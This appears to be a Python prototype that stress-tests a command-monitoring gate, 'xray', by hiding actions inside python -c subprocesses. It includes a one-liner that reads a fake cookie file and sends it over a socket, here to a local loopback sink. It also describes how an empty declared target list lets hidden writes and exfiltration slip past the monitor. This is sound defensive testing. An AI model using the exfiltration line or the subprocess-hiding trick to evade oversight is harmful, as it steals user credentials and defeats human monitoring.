"""
blast_widelens — 给 xray 这台相机加长焦段(原型, 只在 blast 内, 不碰冻结源码)。

现状(transition_xray.scan_transition_xray:363-373 + scope=registered_action_explicit_targets_only):
  xray 只快照 proposal.target_paths。瞎 envelope -> target_paths=[] -> witnesses=0 -> 空对空 STABLE。

本原型:同一台相机, 把镜头从"声明的目标"拉到"整个边界场"——
  复用项目自己的快照原语 scene_seed.capture_surroundings, 对边界目录做全量前后快照,
  再用它自带的 compare() 找空位(SURROUNDING_CREATED/CHANGED/REMOVED)。
  有空位 = mutation 守恒被破 -> KILL。

对照同一组动作的短焦(真 xray)与长焦(全量快照):
  A 藏进子进程的 WRITE  -> 短焦 witnesses=0 漏; 长焦抓到空位 KILL。
  B 藏进子进程的 READ+网络外泄(真读真 socket) -> 短焦漏; 长焦仍 STABLE(读不留空位, 物理极限)。

只读/对比, 真 I/O 在 127.0.0.1 loopback, 只写 dist/blast/。
"""
from __future__ import annotations

import hashlib
import json
import socket
import subprocess
import sys
import threading
from pathlib import Path

ROOT = r"C:\dev\sp"
sys.path.insert(0, ROOT)

from scene_seed import build_scene_seed, capture_surroundings  # noqa: E402
from ot_gate import CommandProposal, DeclaredScope, SideEffect  # noqa: E402
from xray_transport import open_xray_transport, close_xray_transport  # noqa: E402

BLAST = Path(ROOT) / "dist" / "blast"
RUN_DIR = BLAST / "runs" / "blast-widelens"
FIELD = RUN_DIR / "field"


# ---------------------------------------------------------------- loopback sink (真出口)
class _Sink:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(4)
        self.received: list[bytes] = []
        self._stop = False
        threading.Thread(target=self._serve, daemon=True).start()

    @property
    def port(self) -> int:
        return self.sock.getsockname()[1]

    def _serve(self):
        while not self._stop:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                break
            with conn:
                buf = b""
                while True:
                    c = conn.recv(65536)
                    if not c:
                        break
                    buf += c
                self.received.append(buf)
                conn.sendall(b"ACK")

    def shutdown(self):
        self._stop = True
        try:
            self.sock.close()
        except OSError:
            pass


# ---------------------------------------------------------------- 长焦:全量边界场快照
def _all_files(root: Path) -> list[Path]:
    return [p for p in sorted(root.rglob("*")) if p.is_file()]


def _wide_snapshot(seed, root: Path):
    # 复用项目原语, 但镜头 = 整个边界目录当前所有文件(而非声明目标)
    return capture_surroundings(seed, extra_paths=_all_files(root))


# ---------------------------------------------------------------- 短焦:真 xray(声明目标)
def _narrow_xray(command: str, action_fn) -> dict:
    # 真 xray: enter -> 动作 -> exit -> seal。target_paths=[] 即藏进子进程后的真实推断。
    proposal = CommandProposal(
        command_text=command, actor_id="blast", cwd=str(FIELD),
        declared_scope=DeclaredScope.READ_ONLY, target_paths=[],
        proposal_id="widelens", source_adapter="blast",
    )
    handle = open_xray_transport(proposal)
    action_fn()
    seal = close_xray_transport(handle, proposal)
    return {
        "witnesses": seal.witness_count,
        "mutation_state": seal.mutation_state,
        "field_state": seal.field_state,
    }


def _run_buried(py_code: str):
    subprocess.run([sys.executable, "-c", py_code], cwd=str(FIELD),
                   capture_output=True, text=True)


def _sha256_file(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def main() -> int:
    RUN_DIR.mkdir(parents=True, exist_ok=True)
    seed = build_scene_seed(seed_id="blast-widelens", boundary_root=str(FIELD))
    sink = _Sink()

    cookie = FIELD / "cookies.sqlite.fake"
    dump = FIELD / "exfil_dump.txt"
    if dump.exists():
        dump.unlink()

    # ---- A: 藏进子进程的 WRITE(留空位) ----
    a_cmd = r"open('exfil_dump.txt','w').write('stolen-bytes')"
    a_wide_before = _wide_snapshot(seed, FIELD)
    a_narrow = _narrow_xray(f"python.exe -c \"{a_cmd}\"", lambda: _run_buried(a_cmd))
    a_wide_after = _wide_snapshot(seed, FIELD)
    a_wide = a_wide_before.compare(a_wide_after).to_dict()

    # ---- B: 藏进子进程的 READ + 真网络外泄(不留空位) ----
    b_cmd = (
        "import socket;"
        "d=open('cookies.sqlite.fake','rb').read();"
        f"s=socket.create_connection(('127.0.0.1',{sink.port}));"
        "s.sendall(d);s.shutdown(socket.SHUT_WR);s.recv(64);s.close()"
    )
    b_wide_before = _wide_snapshot(seed, FIELD)
    b_narrow = _narrow_xray(f"python.exe -c \"{b_cmd}\"", lambda: _run_buried(b_cmd))
    b_wide_after = _wide_snapshot(seed, FIELD)
    b_wide = b_wide_before.compare(b_wide_after).to_dict()

    sink.shutdown()
    exfiltrated = sink.received and cookie.read_bytes() in sink.received[-1]

    def verdict(wide):
        return "KILL" if wide["requires_hold"] else "CLEAR"

    report = {
        "experiment": "widelens — 给 xray 加长焦",
        "A_buried_write": {
            "narrow_xray": a_narrow,
            "wide_lens": {"verdict": verdict(a_wide),
                          "findings": [f["finding_type"] + ":" + Path(f["path"]).name
                                       for f in a_wide["findings"]]},
        },
        "B_buried_read_egress": {
            "real_egress_happened": bool(exfiltrated),
            "narrow_xray": b_narrow,
            "wide_lens": {"verdict": verdict(b_wide),
                          "findings": [f["finding_type"] + ":" + Path(f["path"]).name
                                       for f in b_wide["findings"]]},
        },
    }
    (RUN_DIR / "verdicts.json").write_text(
        json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")

    md = [
        "# 给 xray 加长焦:短焦(声明目标) vs 长焦(全量边界场)",
        "",
        "同一台相机(`scene_seed` 快照原语),镜头从 `explicit_targets_only` 拉到整个边界目录。",
        "动作都藏进 `python.exe -c \"...\"`(子进程,真实推断 target_paths=[])。",
        "",
        "| 动作 | 短焦 真xray(声明目标) | 长焦 全量场快照 |",
        "|---|---|---|",
        f"| A 藏写盘 | witnesses={a_narrow['witnesses']} mutation={a_narrow['mutation_state']} → **漏** "
        f"| **{verdict(a_wide)}** {report['A_buried_write']['wide_lens']['findings']} |",
        f"| B 藏读+真外泄 | witnesses={b_narrow['witnesses']} mutation={b_narrow['mutation_state']} → **漏** "
        f"| **{verdict(b_wide)}** {report['B_buried_read_egress']['wide_lens']['findings'] or '(无空位)'} |",
        "",
        f"> B 的真外泄确实发生了:loopback sink 收到了 cookie 字节 = **{bool(exfiltrated)}**。",
        "",
        "## 结论",
        "- **加长焦真有用**:A 那种藏进子进程的写/删/移,短焦 witnesses=0 漏掉,长焦靠空位守恒抓到 → KILL。",
        "  这是用你已有的机制(同一台相机)就能拿下的一大类,**离线可做**。",
        "- **物理极限没变**:B 真把 cookie 发出去了(sink 收到字节),但长焦仍 **CLEAR**——",
        "  读是复制,不改任何文件的 size/mtime/hash,**全量快照里没有空位**。镜头再长也照不到网络场。",
        "- 所以 B(cookie/邮箱那类读+外泄)只能靠入口侧:**把 cookie/凭证面设成硬封死区**,",
        "  在它被读之前就拦,而不是指望事后快照。",
        "",
    ]
    (RUN_DIR / "report.md").write_text("\n".join(md), encoding="utf-8")

    sums = RUN_DIR / "SHA256SUMS.txt"
    lines = [f"{_sha256_file(f)}  {f.name}" for f in sorted(RUN_DIR.glob("*"))
             if f.is_file() and f.name != "SHA256SUMS.txt"]
    sums.write_text("\n".join(lines) + "\n", encoding="utf-8")

    print("=" * 70)
    print("BLAST widelens — 给 xray 加长焦")
    print(f"  A 藏写盘     : 短焦 witnesses={a_narrow['witnesses']} → 漏 | "
          f"长焦 {verdict(a_wide)} {report['A_buried_write']['wide_lens']['findings']}")
    print(f"  B 藏读+外泄  : 真外泄={bool(exfiltrated)} | 短焦 witnesses={b_narrow['witnesses']} → 漏 | "
          f"长焦 {verdict(b_wide)} {report['B_buried_read_egress']['wide_lens']['findings'] or '(无空位)'}")
    print(f"artifacts : {RUN_DIR}")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
